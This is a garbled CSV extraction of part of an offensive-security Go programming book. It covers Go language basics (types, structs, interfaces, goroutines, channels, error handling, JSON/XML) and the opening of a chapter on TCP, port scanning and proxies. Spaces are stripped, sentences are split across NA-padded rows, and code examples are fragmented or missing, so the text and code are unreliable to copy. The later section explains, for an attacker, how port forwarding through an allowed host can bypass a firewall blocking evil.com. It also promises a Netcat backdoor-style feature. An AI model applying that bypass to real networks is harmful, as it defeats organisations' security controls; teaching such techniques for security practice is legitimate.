"removesalotofthelower-levelnuances,resultinginbetter ",NA,NA
readabilityandeasieradoption.,NA,NA
DataTypes,NA,NA
"Likemostmodernprogramminglanguages,Goprovidesa ",NA,NA
varietyofprimitiveandcomplexdatatypes.,NA,NA
Primitivetypes ,NA,NA
"consistofthebasicbuildingblocks(suchasstrings,numbers, ",NA,NA
andbooleans)thatyou’reaccustomedtoinotherlanguages.,NA,NA
Primitivesmakeupthefoundationofallinformationused ,NA,NA
withinaprogram.,NA,NA
Complexdatatypes,NA,NA
areuser-defined ,NA,NA
structurescomposedofacombinationofoneormore ,NA,NA
primitiveorothercomplextypes.,NA,NA
PrimitiveDataTypes,NA,NA
Theprimitivetypesinclude,bool,NA
",",string,NA
",",int,NA
",",int8,NA
",",int16,NA
",",int32,NA
",",int64,NA
",",uint,NA
",",uint8,NA
",",uint16,NA
",",uint32,NA
",",uint64,NA
",",uintptr,NA
",",byte,NA
",",rune,NA
",",float32,NA
",",float64,NA
",",complex64,NA
",and",complex128,NA
.,NA,NA
Youtypicallydeclareavariable’stypewhenyoudefineit. ,NA,NA
"Ifyoudon’t,thesystemwillautomaticallyinferthevariable’s ",NA,NA
datatype.Considerthefollowingexamples:,"varx=""HelloWorld""
  
  
 z:=int(42)",NA
"Inthefirstexample,youusethekeyword",var,NA
todefinea,NA,NA
variablenamed,x,NA
andassigntoitthevalue,"""HelloWorld""",NA
.Go,NA,NA
implicitlyinfers,x,NA
tobea,string,NA
",soyoudon’thavetodeclare",NA,NA
"thattype.Inthesecondexample,youusethe",:=,NA
operatorto,NA,NA
defineanewvariablenamed,z,NA
andassigntoitanintegervalue,NA,NA
of42.Therereallyisnodifferencebetweenthetwooperators. ,NA,NA
"We’lluseboththroughoutthisbook,butsomepeoplefeelthat ",NA,NA
the,:=,NA
operatorisanuglysymbolthatreducesreadability.,NA,NA
Choosewhateverworksbestforyou.,NA,NA
"Intheprecedingexample,youexplicitlywrapthe42value ",NA,NA
inan,int,NA
calltoforceatypeonit.Youcouldomitthe,int,NA
call,NA,NA
butwouldhavetoacceptwhatevertypethesystem ,NA,NA
"automaticallyusesforthatvalue.Insomecases,thiswon’tbe ",NA,NA
"thetypeyouintendedtouse.Forinstance,perhapsyouwant ",NA,NA
"42toberepresentedasanunsignedinteger,ratherthanan",int,NA
"type,inwhichcaseyou’dhavetoexplicitlywrapthevalue.",NA,NA
SlicesandMaps,NA,NA
"Goalsohasmore-complexdatatypes,suchasslicesandmaps. ",NA,NA
Slices,NA,NA
arelikearraysthatyoucandynamicallyresizeandpass ,NA,NA
tofunctionsmoreefficiently.,NA,NA
Maps,NA,NA
"areassociativearrays, ",NA,NA
unorderedlistsofkey/valuepairsthatallowyoutoefficiently ,NA,NA
andquicklylookupvaluesforauniquekey.,NA,NA
"Thereareallsortsofwaystodefine,initialize,andwork ",NA,NA
withslicesandmaps.Thefollowingexampledemonstratesa ,NA,NA
commonwaytodefinebothaslice,s,NA
andamap,m,NA
andadd,NA,NA
elementstoboth:,"vars=make([]string,0)
  
  
 varm=make(map[string]string)
  
  
 s=append(s,""somestring"")
  
  
 m[""somekey""]=""somevalue""",NA
Thiscodeusesthetwobuilt-infunctions:,make(),NA
toinitialize,NA,NA
eachvariableand,append(),NA
toaddanewitemtoaslice.Thelast,NA,NA
lineaddsthekey/valuepairof,somekey,NA
and,somevalue,NA
tothemap,m,NA
.WerecommendthatyoureadtheofficialGodocumentation,NA,NA
toexploreallthemethodsfordefiningandusingthesedata ,NA,NA
types.,NA,NA
"Pointers,Structs,andInterfaces",NA,NA
A,NA,NA
pointer,NA,NA
pointstoaparticularareainmemoryandallowsyou ,NA,NA
"toretrievethevaluestoredthere.AsyoudoinC,youusethe ",&,NA
"operatortoretrievetheaddressinmemoryofsomevariable,",NA,NA
andthe,*,NA
operatortodereferencetheaddress.Thefollowing,NA,NA
exampleillustratesthis:,"❶varcount=int(42)
  
 ❷ptr:=&count
  
 ❸fmt.Println(*ptr)
  
 ❹*ptr=100
  
 ❺fmt.Println(count)",NA
"Thecodedefinesaninteger,",count,NA
"❶,andthencreatesa ",NA,NA
pointer❷byusingthe,&,NA
operator.Thisreturnstheaddressof ,NA,NA
the,count,NA
variable.Youdereferencethevariable❸while ,NA,NA
makingacallto,fmt.Println(),NA
tologthevalueof,count,NA
tostdout. ,NA,NA
Youthenusethe,*,NA
operator❹toassignanewvaluetothe ,NA,NA
memorylocationpointedtoby,ptr,NA
.Becausethisistheaddress,NA,NA
ofthe,count,NA
"variable,theassignmentchangesthevalueofthat ",NA,NA
"variable,whichyouconfirmbyprintingittothescreen❺.",NA,NA
Youusethe,NA,NA
struct,NA,NA
typetodefinenewdatatypesby ,NA,NA
specifyingthetype’sassociatedfieldsandmethods.For ,NA,NA
"example,thefollowingcodedefinesa",Person,NA
type:,NA,NA
Thecodeusesthe,type,NA
keyword❶todefineanewstruct ,NA,NA
containingtwofields:a,string,NA
named,Name,NA
❷andan,int,NA
named ,Age,NA
❸.,NA,NA
"Youdefineamethod,",SayHello(),NA
",onthe",Person,NA
typeassigned ,NA,NA
tovariable,p,NA
❹.Themethodprintsagreetingmessageto ,NA,NA
"stdoutbylookingatthestruct,",p,NA
"❺,thatreceivedthecall. ",NA,NA
Thinkof,p,NA
asareferenceto,self,NA
or,this,NA
inotherlanguages.You,NA,NA
"alsodefineafunction,",main(),NA
",whichactsastheprogram’sentry ",NA,NA
point.Thisfunctionusesthe,new,NA
keyword❻toinitializeanew ,Person,NA
.Itassignsthename,Dave,NA
totheperson❼andthentells ,NA,NA
thepersonto,SayHello(),NA
❽.,NA,NA
"Structslackscopingmodifiers—suchasprivate,public,or ",NA,NA
protected—thatarecommonlyusedinotherlanguagesto ,NA,NA
"controlaccesstotheirmembers.Instead,Gouses ",NA,NA
capitalizationtodeterminescope:typesandfieldsthatbegin ,NA,NA
withacapitalletterareexportedandaccessibleoutsidethe ,NA,NA
"package,whereasthosestartingwithalowercaseletterare ",NA,NA
"private,accessibleonlywithinthepackage.",NA,NA
YoucanthinkofGo’s,NA,NA
interface,NA,NA
typeasablueprintora ,NA,NA
contract.Thisblueprintdefinesanexpectedsetofactionsthat ,NA,NA
anyconcreteimplementationmustfulfillinordertobe,NA,NA
"consideredatypeofthatinterface.Todefineaninterface,you",NA,NA
defineasetofmethods;anydatatypethatcontainsthose,NA,NA
methodswiththecorrectsignaturesfulfillsthecontractandis,NA,NA
consideredatypeofthatinterface.Let’stakealookatan,NA,NA
example:,"❶typeFriendinterface{
  
  
 ❷SayHello()
  
 }",NA
"Inthissample,you’vedefinedaninterfacecalled",Friend,NA
❶th,NA,NA
atrequiresonemethodtobeimplemented:,SayHello(),NA
❷.That ,NA,NA
meansthatanytypethatimplementsthe,SayHello(),NA
methodisa,Friend,NA
.Noticethatthe,Friend,NA
interfacedoesn’tactually,NA,NA
implementthatfunction—itjustsaysthatifyou’rea,Friend,NA
",you",NA,NA
needtobeableto,SayHello(),NA
.,NA,NA
"Thefollowingfunction,",Greet(),NA
",takesa",Friend,NA
interfaceas,NA,NA
inputandsayshelloina,Friend,NA
-specificway:,"funcGreet❶(fFriend❷){ 
  
 f.SayHello()
  
  
 }",NA
Youcanpassany,Friend,NA
"typetothefunction.Luckily,the",Person,NA
typeusedinthepreviousexamplecan,SayHello(),NA
—it’sa ,Friend,NA
".Therefore,ifafunctionnamed",Greet(),NA
"❶,asshowninthe ",NA,NA
"precedingcode,expectsa",Friend,NA
"asaninputparameter❷,you ",NA,NA
canpassita,Person,NA
",likethis:","funcmain(){
  
  
 varguy=new(Person)
  
  
 guy.Name=""Dave""
  
  
 Greet(guy)
  
  
 }",NA
"Usinginterfacesandstructs,youcandefinemultipletypes",NA,NA
thatyoucanpasstothesame,Greet(),NA
"function,solongasthese",NA,NA
typesimplementthe,Friend,NA
interface.Considerthismodified,NA,NA
example:,"❶typeDogstruct{} 
  
 func(d*Dog)SayHello()❷{
  
 fmt.Println(""Woofwoof"")
  
  
 }
  
  
 funcmain(){
  
  
 varguy=new(Person)
  
  
 guy.Name=""Dave""
  
  
 ❸Greet(guy) 
  
 vardog=new(Dog)
  
  
 ❹Greet(dog) 
  
 }",NA
"Theexampleshowsanewtype,",Dog,NA
"❶,thatisableto ",SayHello(),NA
"❷and,therefore,isa",Friend,NA
.Youareableto,Greet(),NA
botha,Person,NA
❸anda,Dog,NA
"❹,sincebotharecapableof ",SayHello(),NA
.,NA,NA
We’llcoverinterfacesmultipletimesthroughoutthebook,NA,NA
tohelpyoubetterunderstandtheconcept.,NA,NA
ControlStructures,NA,NA
Gocontainsslightlyfewercontrolstructuresthanother,NA,NA
"modernlanguages.Despitethat,youcanstillaccomplish",NA,NA
"complexprocessing,includingconditionalsandloops,with",NA,NA
Go.,NA,NA
Go’sprimaryconditionalistheif/elsestructure:,"ifx==1{
  
  
 fmt.Println(""Xisequalto1"")",NA
Go’ssyntaxdeviatesslightlyfromthesyntaxofother ,NA,NA
"languages.Forinstance,youdon’twraptheconditionalcheck",NA,NA
"—inthiscase,",x==1,NA
—inparentheses.Youmustwrapallcode,NA,NA
"blocks,eventheprecedingsingle-lineblocks,inbraces.Many ",NA,NA
othermodernlanguagesmakethebracesoptionalforsingle-,NA,NA
"lineblocks,butthey’rerequiredinGo.",NA,NA
"Forconditionalsinvolvingmorethantwochoices,Go ",NA,NA
providesa,switch,NA
statement.Thefollowingisanexample:,"switchx❶{ 
  
 case""foo""❷: 
  
 fmt.Println(""Foundfoo"") 
  
 case""bar""❸: 
  
 fmt.Println(""Foundbar"") 
  
 default❹: 
  
 fmt.Println(""Defaultcase"")
  
  
 }",NA
"Inthisexample,the",switch,NA
statementcomparesthecontent,NA,NA
s ofavariable,x,NA
❶againstvariousvalues—,foo,NA
❷and,bar,NA
❸—,NA,NA
andlogsamessagetostdoutif,x,NA
matchesoneofthe ,NA,NA
conditions.Thisexampleincludesa,default,NA
"case❹,which ",NA,NA
executesintheeventthatnoneoftheotherconditionsmatch.,NA,NA
"Notethat,unlikemanyothermodernlanguages,yourcases ",NA,NA
don’thavetoinclude,break,NA
"statements.Inotherlanguages,",NA,NA
executionoftencontinuesthrougheachofthecasesuntilthe ,NA,NA
codereachesa,break,NA
statementortheendofthe,switch,NA
.Gowill,NA,NA
executenomorethanonematchingordefaultcase.,NA,NA
Goalsocontainsaspecialvariationonthe,switch,NA
calleda,NA,NA
typeswitch,NA,NA
thatperformstypeassertionsbyusinga,switch,NA
statement.Typeswitchesareusefulfortryingtounderstand,NA,NA
"theunderlyingtypeofaninterface.Forexample,youmight",NA,NA
useatypeswitchtoretrievetheunderlyingtypeofaninterface,NA,NA
called,i,NA
:,"funcfoo(i❶interface{}){ 
  
 switchv:=i.(type)❷{
  
 caseint:
  
  
 fmt.Println(""I'maninteger!"")
  
  
 casestring:
  
  
 fmt.Println(""I'mastring!"")
  
  
 default:
  
  
 fmt.Println(""Unknowntype!"")
  
  
 }
  
  
 }",NA
"Thisexampleusesspecialsyntax,",i.(type),NA
"❷,toretrievethe ",NA,NA
typeofthe,iinterface,NA
variable❶.Youusethisvalueina,switch,NA
statementinwhicheachcasematchesagainstaspecifictype.,NA,NA
"Inthisexample,yourcasescheckfor",int,NA
or,string,NA
primitive,NA,NA
"types,butyoucouldverywellcheckforpointersoruser-",NA,NA
"definedstructtypes,forinstance.",NA,NA
Go’slastflowcontrolstructureisthe,for,NA
loop.The,for,NA
loop,NA,NA
isGo’sexclusiveconstructforperformingiterationor,NA,NA
repeatingsectionsofcode.Itmightseemoddtonothave,NA,NA
conventionssuchas,do,NA
or,while,NA
"loopsatyourdisposal,butyou",NA,NA
canre-createthembyusingvariationsofthe,for,NA
loopsyntax.,NA,NA
Here’sonevariationofa,for,NA
loop:,"fori:=0;i<10;i++{
  
  
 fmt.Println(i)
  
  
 }",NA
"Thecodeloopsthroughnumbers0to9,printingeach ",NA,NA
numbertostdout.Noticethesemicolonsinthefirstline. ,NA,NA
"Unlikemanyotherlanguages,whichusesemicolonsasline ",NA,NA
"delimiters,Gousesthemforvariouscontrolstructuresto ",NA,NA
"performmultipledistinct,butrelated,subtasksinasingleline ",NA,NA
ofcode.Thefirstlineusesthesemicolonstoseparatethe ,NA,NA
initializationlogic(,i:=0,NA
"),theconditionalexpression(",i<10,NA
"),",NA,NA
andthepoststatement(,i++,NA
").Thisstructureshouldbevery,",NA,NA
veryfamiliartoanyonewhohascodedinanymodern ,NA,NA
"language,asitcloselyfollowstheconventionsofthose ",NA,NA
languages.,NA,NA
Thefollowingexampleshowsaslightvariationofthe,for,NA
"loopthatloopsoveracollection,suchasasliceoramap:","❶nums:=[]int{2,4,6,8} 
  
 foridx❷,val❸:=range❹nums{
  
 fmt.Println(idx,val)
  
  
 }",NA
"Inthisexample,youinitializeasliceofintegersnamed ",nums,NA
❶.Youthenusethekeyword,range,NA
❹withinthe,for,NA
loop ,NA,NA
toiterateovertheslice.The,range,NA
keywordreturnstwovalues: ,NA,NA
thecurrentindex❷andacopyofthecurrentvalue❸atthat ,NA,NA
"index.Ifyoudon’tintendtousetheindex,youcouldreplace ",idx,NA
inthe,for,NA
loopwithanunderscoretotellGoyouwon’tneed,NA,NA
it.,NA,NA
Youcanusethisexactsameloopinglogicwithmapsas ,NA,NA
welltoreturneachkey/valuepair.,NA,NA
Concurrency,NA,NA
"Muchlikethecontrolstructuresalreadyreviewed,Gohasa",NA,NA
muchsimplerconcurrencymodelthanotherlanguages.To ,NA,NA
"executecodeconcurrently,youcanuse",NA,NA
goroutines,NA,NA
",whichare ",NA,NA
functionsormethodsthatcanrunsimultaneously.Theseare ,NA,NA
oftendescribedas,NA,NA
lightweightthreads,NA,NA
becausethecostof ,NA,NA
creatingthemisminimalwhencomparedtoactualthreads.,NA,NA
"Tocreateagoroutine,usethe",go,NA
keywordbeforethecallto,NA,NA
amethodorfunctionyouwishtorunconcurrently:,"❶funcf(){ 
  
 fmt.Println(""ffunction"")
  
  
 }
  
  
 funcmain(){
  
  
 ❷gof() 
  
 time.Sleep(1*time.Second)
  
  
 fmt.Println(""mainfunction"")
  
  
 }",NA
"Inthisexample,youdefineafunction,",f(),NA
"❶,thatyoucall ",NA,NA
inyour,main(),NA
"function,theprogram’sentrypoint.Youpreface ",NA,NA
thecallwiththekeyword,go,NA
"❷,meaningthattheprogramwill ",NA,NA
runfunction,f(),NA
"concurrently;inotherwords,theexecutionof",NA,NA
your,main(),NA
functionwillcontinuewithoutwaitingfor,f(),NA
to,NA,NA
complete.Youthenusea,time.Sleep(1*time.Second),NA
toforcethe,main(),NA
functiontopausetemporarilysothat,f(),NA
cancomplete.If,NA,NA
youdidn’tpausethe,main(),NA
"function,theprogramwouldlikely",NA,NA
exitpriortothecompletionoffunction,f(),NA
",andyouwould",NA,NA
"neverseeitsresultsdisplayedtostdout.Donecorrectly,you’ll ",NA,NA
seemessagesprintedtostdoutindicatingthatyou’vefinished ,NA,NA
executingboththe,f(),NA
and,main(),NA
functions.,NA,NA
Gocontainsadatatypecalled,NA,NA
channels,NA,NA
thatprovidea ,NA,NA
mechanismthroughwhichgoroutinescansynchronizethei,NA,NA
r,NA,NA
executionandcommunicatewithoneanother.Let’slookatan ,NA,NA
examplethatuseschannelstodisplaythelengthofdifferent ,NA,NA
stringsandtheirsumsimultaneously:,"❶funcstrlen(sstring,cchanint){
  
  
 ❷c<-len(s)
  
 }
  
  
 funcmain(){
  
  
 ❸c:=make(chanint)
  
  
 ❹gostrlen(""Salutations"",c) 
  
 gostrlen(""World"",c)
  
  
 ❺x,y:=<-c,<-c 
  
 fmt.Println(x,y,x+y)
  
  
 }",NA
"First,youdefineanduseavariable",c,NA
oftype,chanint,NA
.You,NA,NA
"candefinechannelsofvarioustypes,dependingonthetypeof ",NA,NA
"datayouintendtopassviathechannel.Inthiscase,you’llbe ",NA,NA
passingthelengthsofvariousstringsasintegervalues ,NA,NA
"betweengoroutines,soyoushouldusean",int,NA
channel.,NA,NA
Noticeanewoperator:,<-,NA
.Thisoperatorindicateswhether,NA,NA
thedataisflowingtoorfromachannel.Youcanthinkofthis ,NA,NA
astheequivalentofplacingitemsintoabucketorremoving ,NA,NA
itemsfromabucket.,NA,NA
"Thefunctionyoudefine,",strlen(),NA
"❶,acceptsawordasa ",NA,NA
"string,aswellasachannelthatyou’lluseforsynchronizing ",NA,NA
"data.Thefunctioncontainsasinglestatement,",c<-len(s),NA
"❷, ",NA,NA
whichusesthebuilt-in,len(),NA
functiontodeterminethelengthof,NA,NA
"thestring,andthenputstheresultintothe",c,NA
channelbyusing,NA,NA
the,<-,NA
operator.,NA,NA
The,main(),NA
"functionpieceseverythingtogether.First,you",NA,NA
issueacallto,make(chanint),NA
❸tocreatetheintegerchannel.You ,NA,NA
thenissuemultipleconcurrentcallstothe,strlen(),NA
functionby ,NA,NA
usingthe,go,NA
"keyword❹,whichspinsupmultiplegoroutines. ",NA,NA
Youpasstothe,strlen(),NA
"functiontwostringvalues,aswellasthe",NA,NA
"channelintowhichyouwanttheresultsplaced.Lastly,you ",NA,NA
readdatafromthechannelbyusingthe,<-,NA
"operator❺,this ",NA,NA
timewithdataflowingfromthechannel.Thismeansyou’re ,NA,NA
"takingitemsoutofyourbucket,sotospeak,andassigning ",NA,NA
thosevaluestothevariables,x,NA
and,y,NA
.Notethatexecution,NA,NA
blocksatthislineuntiladequatedatacanbereadfromthe ,NA,NA
channel.,NA,NA
"Whenthelinecompletes,youdisplaythelengthofeach ",NA,NA
"stringaswellastheirsumtostdout.Inthisexample,it ",NA,NA
producesthefollowingoutput:,51116,NA
"Thismayseemoverwhelming,butit’skeytohighlight ",NA,NA
"basicconcurrencypatterns,asGoshinesinthisarea.Because ",NA,NA
concurrencyandparallelisminGocanbecomerather ,NA,NA
"complicated,feelfreetoexploreonyourown.Throughoutthis ",NA,NA
"book,we’lltalkaboutmorerealisticandcomplicated ",NA,NA
implementationsofconcurrencyasweintroducebuffered ,NA,NA
"channels,waitgroups,mutexes,andmore.",NA,NA
ErrorHandling,NA,NA
"Unlikemostothermodernprogramminglanguages,Godoes ",NA,NA
notincludesyntaxfortry/catch/finallyerrorhandling.Instea,NA,NA
"d, ",NA,NA
itadoptsaminimalisticapproachthatencouragesyoutocheck ,NA,NA
forerrorswheretheyoccurratherthanallowingthemto,NA,NA
“bubbleup”tootherfunctionsinthecallchain.,NA,NA
Godefinesabuilt-inerrortypewiththefollowing,interface,NA
declaration:,"typeerrorinterface{
  
  
 Error()string
  
  
 }",NA
Thismeansyoucanuseanydatatypethatimplementsa,NA,NA
methodnamed,Error(),NA
",whichreturnsa",string,NA
"value,asan",error,NA
.,NA,NA
"Forexample,here’sacustomerroryoucoulddefineanduse",NA,NA
throughoutyourcode:,"❶typeMyErrorstring 
  
 func(eMyError)Error()string❷{
  
 returnstring(e)
  
  
 }",NA
Youcreateauser-definedstringtypenamed,MyError,NA
❶and ,NA,NA
implementan,Error()string,NA
method❷forthetype. ,NA,NA
"Whenitcomestoerrorhandling,you’llquicklyget",NA,NA
accustomedtothefollowingpattern:,"funcfoo()error{
  
  
 returnerrors.New(""SomeErrorOccurred"")
  
  
 }
  
  
 funcmain(){ 
  
 iferr:=foo()❶;err!=nil❷{ 
  
 //Handletheerror
  
  
 }
  
  
 }",NA
You’llfindthatit’sfairlycommonforfunctionsand,NA,NA
methodstoreturnatleastonevalue.Oneofthesevaluesis,NA,NA
almostalwaysan,error,NA
".InGo,the",error,NA
returnedmaybeavalue,NA,NA
of,nil,NA
",indicatingthatthefunctiongeneratednoerrorand",NA,NA
everythingseeminglyranasexpected.Anon-,nil,NA
valuemeans,NA,NA
somethingbrokeinthefunction.,NA,NA
"Thus,youcancheckforerrorsbyusingan",if,NA
"statement,as",NA,NA
showninthe,main(),NA
function.You’lltypicallyseemultiple,NA,NA
"statements,separatedbyasemicolon.Thefirststatementcalls ",NA,NA
thefunctionandassignstheresultingerrortoavariable❶. ,NA,NA
Thesecondstatementthencheckswhetherthat,error,NA
is,nil,NA
❷.,NA,NA
Youusethebodyofthe,if,NA
statementtohandletheerror.,NA,NA
You’llfindthatphilosophiesdifferonthebestwayto ,NA,NA
"handleandlogerrorsinGo.Oneofthechallengesisthat, ",NA,NA
"unlikeotherlanguages,Go’sbuilt-inerrortypedoesn’t ",NA,NA
implicitlyincludeastacktracetohelpyoupinpointtheerror’s ,NA,NA
contextorlocation.Althoughyoucancertainlygenerateone ,NA,NA
"andassignittoacustomtypeinyourapplication,its ",NA,NA
implementationisleftuptothedevelopers.Thiscanbealittle ,NA,NA
"annoyingatfirst,butyoucanmanageitthroughproper ",NA,NA
applicationdesign.,NA,NA
HandlingStructuredData,NA,NA
Securitypractitionerswilloftenwritecodethathandles ,NA,NA
structureddata,NA,NA
",ordatawithcommonencoding,suchasJSON ",NA,NA
orXML.Gocontainsstandardpackagesfordataencoding.,NA,NA
Themostcommonpackagesyou’relikelytouseinclude ,encoding/json,NA
and,encoding/xml,NA
.,NA,NA
Bothpackagescanmarshalandunmarshalarbitrarydata ,NA,NA
"structures,whichmeanstheycanturnstringstostructures,an",NA,NA
d ,NA,NA
"structurestostrings.Let’slookatthefollowingsample,which ",NA,NA
serializesastructuretoabytesliceandthensubsequently ,NA,NA
deserializesthebyteslicebacktoastructure:,NA,NA
Thiscode(whichdeviatesfrombestpracticesandignores ,NA,NA
possibleerrors)definesa,struct,NA
typenamed,Foo,NA
❶.You ,NA,NA
initializeitinyour,main(),NA
function❷andthenmakeacallto ,json.Marshal(),NA
"❹,passingitthe",Foo,NA
instance❺.This,Marshal(),NA
methodencodesthe,struct,NA
"toJSON,returninga",byte,NA
slice❸that ,NA,NA
"yousubsequentlyprinttostdout❻.Theoutput,shownhere,is ",NA,NA
aJSON-encodedstringrepresentationofour,Foo,NA
struct:,"{""Bar"":""JoeJunior"",""Baz"":""HelloShabado""}",NA
"Lastly,youtakethatsame",byte,NA
slice❼anddecodeitviaa ,NA,NA
callto,"json.Unmarshal(b,&f)",NA
.Thisproducesa,Foo,NA
structinstance❽.D,NA,NA
ealingwithXMLisnearlyidenticaltothisprocess. ,NA,NA
"WhenworkingwithJSONandXML,you’llcommonlyuse",NA,NA
fieldtags,NA,NA
",whicharemetadataelementsthatyouassigntoyour",NA,NA
structfieldstodefinehowthemarshalingandunmarshaling,NA,NA
logiccanfindandtreattheaffiliatedelements.Numerous,NA,NA
"variationsofthesefieldtagsexist,buthereisashortexample",NA,NA
thatdemonstratestheirusageforhandlingXML:,"typeFoostruct{
  
  
 Barstring`xml:""id,attr""`
  
  
 Bazstring`xml:""parent>child""`",NA
"Thestringvalues,wrappedinbackticksandfollowingthe ",NA,NA
"structfields,arefieldtags.",NA,NA
Fieldtags,NA,NA
alwaysbeginwiththe ,NA,NA
tagname(,xml,NA
"inthiscase),followedbyacolonandthe",NA,NA
directiveenclosedindoublequotes.The,NA,NA
directive,NA,NA
defineshow ,NA,NA
"thefieldsshouldbehandled.Inthiscase,youaresupplying ",NA,NA
directivesthatdeclarethat,Bar,NA
shouldbetreatedasanattribute,NA,NA
named,id,NA
",notanelement,andthat",Baz,NA
shouldbefoundina,NA,NA
subelementof,parent,NA
",named",child,NA
.Ifyoumodifytheprevious,NA,NA
"JSONexampletonowencodethestructureasXML,you ",NA,NA
wouldseethefollowingresult:,"<Fooid=""JoeJunior""><parent><child>HelloShabado</child></parent></Foo>",NA
TheXMLencoderreflectivelydeterminesthenamesof ,NA,NA
"elements,usingthetagdirectives,soeachfieldishandled ",NA,NA
accordingtoyourneeds.,NA,NA
"Throughoutthisbook,you’llseethesefieldtagsusedfor ",NA,NA
"dealingwithotherdataserializationformats,includingASN.1 ",NA,NA
andMessagePack.We’llalsodiscusssomerelevantexamples ,NA,NA
"ofdefiningyourowncustomtags,specificallywhenyoulearn ",NA,NA
howtohandletheServerMessageBlock(SMB)Protocol.,NA,NA
SUMMARY,NA,NA
"Inthischapter,yousetupyourGoenvironmentandlearned ",NA,NA
aboutthefundamentalaspectsoftheGolanguage.Thisisnot ,NA,NA
anexhaustivelistofallGo’scharacteristics;thelanguageis ,NA,NA
fartoonuancedandlargeforustocramitallintoasingle ,NA,NA
"chapter.Instead,weincludedtheaspectsthatwillbemost",NA,NA
usefulinthechaptersthatfollow.We’llnowturnourattention ,NA,NA
topracticalapplicationsofthelanguageforsecurity ,NA,NA
practitionersandhackers.HereweGo!,NA,NA
2 ,NA,NA
"TCP,SCANNERS,ANDPROXIES",NA,NA
Let’sbeginourpracticalapplicationofGowiththe ,NA,NA
TransmissionControlProtocol(TCP),NA,NA
",thepredominant ",NA,NA
standardforconnection-,NA,NA
"oriented,reliablecommunicationsand ",NA,NA
"thefoundationofmodernnetworking.TCPiseverywhere,and ",NA,NA
"ithaswell-documentedlibraries,codesamples,andgenerally ",NA,NA
easy-to-understandpacketflows.YoumustunderstandTCPto ,NA,NA
"fullyevaluate,analyze,query,andmanipulatenetworktraffic.",NA,NA
"Asanattacker,youshouldunderstandhowTCPworksand ",NA,NA
beabletodevelopusableTCPconstructssothatyoucan ,NA,NA
"identifyopen/closedports,recognizepotentiallyerrantresult",NA,NA
"s suchasfalse-positives—forexample,syn-",NA,NA
floodprotections—,NA,NA
andbypassegressrestrictionsthroughportforwarding.Inthis ,NA,NA
"chapter,you’lllearnbasicTCPcommunicationsinGo;builda ",NA,NA
"concurrent,properlythrottledportscanner;createaTCPprox",NA,NA
y thatcanbeusedforportforwarding;andre-,NA,NA
createNetcat’s“gapingsecurityhole”feature.,NA,NA
Entiretextbookshavebeenwrittentodiscusseverynuance ,NA,NA
"ofTCP,includingpacketstructureandflow,reliability,",NA,NA
"communicationreassembly,andmore.Thislevelofdetailis ",NA,NA
"beyondthescopeofthisbook.Formoredetails,youshould ",NA,NA
read,NA,NA
TheTCP/IPGuide,NA,NA
byCharlesM.Kozierok(NoStarch ,NA,NA
"Press,2005).",NA,NA
UNDERSTANDINGTHETCP ,NA,NA
HANDSHAKE,NA,NA
"Forthosewhoneedarefresher,let’sreviewthebasics.",NA,NA
Figure ,NA,NA
2-1,NA,NA
showshowTCPusesahandshakeprocesswhenquerying ,NA,NA
"aporttodeterminewhethertheportisopen,closed,or ",NA,NA
filtered.,NA,NA
"Iftheportisopen,athree-wayhandshaketakesplace. ",NA,NA
"First,theclientsendsa",NA,NA
synpacket,NA,NA
",whichsignalsthe",NA,NA
beginningofacommunication.Theserverthenrespondswith ,NA,NA
a,NA,NA
syn-ack,NA,NA
",oracknowledgmentofthesynpacketitreceived, ",NA,NA
promptingtheclienttofinishwithan,NA,NA
ack,NA,NA
",oracknowledgment ",NA,NA
oftheserver’sresponse.Thetransferofdatacanthenoccur.If ,NA,NA
"theportisclosed,theserverrespondswitha",NA,NA
rst,NA,NA
packetinstead ,NA,NA
"ofasyn-ack.Ifthetrafficisbeingfilteredbyafirewall,the ",NA,NA
clientwilltypicallyreceivenoresponsefromtheserver.,NA,NA
Theseresponsesareimportanttounderstandwhenwritin,NA,NA
g network-basedtools.Correlatingtheoutputofyourtoolsto ,NA,NA
theselow-levelpacketflowswillhelpyouvalidatethatyou’ve ,NA,NA
properlyestablishedanetworkconnectionandtroubleshoot ,NA,NA
"potentialproblems.Asyou’llseelaterinthischapter,youcan ",NA,NA
easilyintroducebugsintoyourcodeifyoufailtoallowfull ,NA,NA
"client-serverTCPconnectionhandshakestocomplete, ",NA,NA
resultingininaccurateormisleadingresults.,NA,NA
BYPASSINGFIREWALLSWITH ,NA,NA
PORTFORWARDING,NA,NA
Peoplecanconfigurefirewallstopreventaclientfrom ,NA,NA
"connectingtocertainserversandports,whileallowingaccess ",NA,NA
"toothers.Insomecases,youcancircumventtheserestrictions ",NA,NA
byusinganintermediarysystemtoproxytheconnection ,NA,NA
"aroundorthroughafirewall,atechniqueknownas",NA,NA
port ,NA,NA
forwarding,NA,NA
.,NA,NA
Manyenterprisenetworksrestrictinternalassetsfrom ,NA,NA
establishingHTTPconnectionstomalicioussites.Forthis ,NA,NA
"example,imagineanefarioussitecalled",NA,NA
evil.com,NA,NA
.Ifan ,NA,NA
employeeattemptstobrowse,NA,NA
evil.com,NA,NA
"directly,afirewall ",NA,NA
"blockstherequest.However,shouldanemployeeownan",NA,NA
externalsystemthat’sallowedthroughthefirewall(for ,NA,NA
"example,",NA,NA
stacktitan.com,NA,NA
"),thatemployeecanleveragethe ",NA,NA
alloweddomaintobounceconnectionsto,NA,NA
evil.com,NA,NA
.,NA,NA
Figure2-2 ,NA,NA
illustratesthisconcept.,Figure2-1:ATCPproxy,NA
"Aclientconnects,throughafirewall,tothedestinationhost ",NA,NA
stacktitan.com,NA,NA
.Thishostisconfiguredtoforwardconnections ,NA,NA
tothehost,NA,NA
evil.com,NA,NA
.Whileafirewallforbidsdirect ,NA,NA
connectionsto,NA,NA
evil.com,NA,NA
",aconfigurationsuchastheoneshown ",NA,NA
herecouldallowaclienttocircumventthisprotection ,NA,NA
mechanismandaccess,NA,NA
evil.com,NA,NA
.,NA,NA
Youcanuseportforwardingtoexploitseveralrestrictive ,NA,NA
"networkconfigurations.Forexample,youcouldforward ",NA,NA
trafficthroughajumpboxtoaccessasegmentednetworkor ,NA,NA
accessportsboundtorestrictiveinterfaces.,NA,NA
WRITINGATCPSCANNER,NA,NA
OneeffectivewaytoconceptualizetheinteractionofTCP ,NA,NA
"portsisbyimplementingaportscanner.Bywritingone,you’ll ",NA,NA
"observethestepsthatoccurinaTCPhandshake,alongwith ",NA,NA
"theeffectsofencounteredstatechanges,whichallowyouto ",NA,NA
determinewhetheraTCPportisavailableorwhetherit ,NA,NA
respondswithaclosedorfilteredstate.,NA,NA
"Onceyou’vewrittenabasicscanner,you’llwriteonethat’s ",NA,NA
faster.Aportscannermayscanseveralportsbyusingasingle ,NA,NA
